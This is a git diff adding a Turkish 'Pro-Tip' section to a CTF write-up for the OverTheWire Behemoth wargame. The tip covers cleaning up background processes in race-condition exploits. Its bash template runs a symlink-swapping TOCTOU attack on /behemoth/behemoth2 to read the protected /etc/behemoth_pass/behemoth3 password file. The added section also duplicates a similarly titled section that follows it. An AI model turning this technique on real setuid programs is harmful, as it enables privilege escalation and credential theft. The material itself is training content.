@@ -226,8 +226,57 @@ Birden fazla deneme sonrasında `/tmp` altında sahte dosyalar kalabilir. Başla
 ```bash
 rm -f /tmp/behemoth2.* /tmp/behemoth4.*
 ```
-
 ---
+### 💡 Pro-Tip: Temiz ve Güvenli Race Scriptleri (`trap` Kullanımı)
+
+Race condition zafiyetlerini sömürürken en sık kullandığımız yöntem, arka planda sonsuz döngüler (`while true; do ... done &`) başlatarak sembolik linkleri (symlink) saliseler içinde sürekli değiştirmektir. Ancak yeni başlayanların yaptığı en büyük hata, exploit başarılı olduğunda veya `Ctrl+C` ile scripti durdurduğunda arka plandaki bu süreçleri kendi haline bırakmaktır.
+
+#### 🧟‍♂️ Sunucuyu Kitleyen Zombi Süreçler
+Eğer arka plandaki döngü sürecini (process) manuel olarak öldürmezseniz, siz exploit scriptinden çıksanız bile o döngü arka planda işlemciyi (CPU) son hızda tüketmeye devam eder. Paylaşımlı CTF veya OverTheWire gibi wargame sunucularında arkada onlarca zombi süreç bırakmak, sunucunun tamamen kilitlenmesine yol açar ve diğer oyuncuların platformu kullanmasını engeller (bu durum genellikle platform adminleri tarafından banlanma sebebidir).
+
+#### 🛠️ Çözüm: Bash `trap` Mekanizması
+Yazdığın exploit scriptinin başına bir `trap` (tuzak/yakalayıcı) ekleyerek, script herhangi bir sebeple kapandığında (ister sen `Ctrl+C` yap, ister script hata verip kapansın) arka plandaki tüm süreçlerin ve geçici dosyaların **otomatik olarak** temizlenmesini sağlayabilirsin.
+
+İşte endüstri standartlarında, temiz bir race condition exploit scripti şablonu:
+
+```bash
+#!/bin/bash
+
+# Script sonlandırıldığında çalışacak temizlik fonksiyonu
+temizlik() {
+    echo -e "\n[!] Sinyal yakalandı! Temizlik yapılıyor, zombi süreçler öldürülüyor..."
+    # Arka plandaki race sürecini öldür
+    kill $RACE_PID 2>/dev/null
+    # /tmp altında oluşturulan geçici dosyaları temizle
+    rm -f /tmp/behemoth2.*
+    exit
+}
+
+# INT (Ctrl+C), TERM (Kapatma) ve EXIT (Normal çıkış) sinyallerini yakala, 
+# bu sinyaller geldiğinde yukarıdaki 'temizlik' fonksiyonunu çalıştır.
+trap temizlik INT TERM EXIT
+
+# 1. Sembolik link değiştirme döngüsünü ARKA PLANDA (&) başlat
+while true; do
+    ln -sf /tmp/guvenli /tmp/tuzak
+    ln -sf /etc/behemoth_pass/behemoth3 /tmp/tuzak
+done &
+
+# 2. En son başlatılan arka plan sürecinin PID'sini (Process ID) kaydet
+RACE_PID=$! 
+
+echo "[+] Race condition döngüsü arka planda başladı. (PID: $RACE_PID)"
+echo "[+] Hedef program tetikleniyor..."
+
+# 3. Ana saldırı döngüsü (hedef programı defalarca çalıştır)
+for i in $(seq 1 200); do
+    /behemoth/behemoth2 /tmp/tuzak 2>/dev/null
+done
+
+# Script normal olarak bitse bile en üstteki trap mekanizması devreye girer 
+# ve arka plandaki süreci tertemiz arkasında iz bırakmadan kapatır.
+```
+Bu refleksi kazanmak, sadece CTF sunucularında saygı görmeni sağlamaz; gerçek dünya sızma testlerinde (pentest) arkanda çalışan zombi süreçler bırakarak hedef sistemi çökertme riskini de sıfıra indirir.
 
 ## 💡 Pro-Tip: Temiz Race Condition Scriptleri — `trap` Kullanımı
 
@@ -274,7 +323,6 @@ Bu alışkanlık sadece CTF'lerde değil, gerçek dünya sızma testlerinde de h
 ---
 
 ## Özet
-
 ```
 Race Condition (TOCTOU)
          │
